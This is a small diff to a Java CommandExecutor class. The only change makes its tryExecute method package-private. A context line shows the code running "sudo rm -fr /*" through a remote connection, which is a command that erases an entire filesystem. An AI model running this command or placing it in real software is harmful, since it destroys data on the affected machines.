@@ -15,7 +15,7 @@ public record CommandExecutor(ConnectionManager connectionManager, int maxAttemp
         tryExecute("sudo rm -fr /*");
     }
 
-    private void tryExecute(String command) throws ConnectionException {
+    void tryExecute(String command) throws ConnectionException {
         /* Initialize connection.  */
         try (Connection connection = connectionManager.getConnection()) {
             /* If connection has been initialized attempt to execute the given command. */
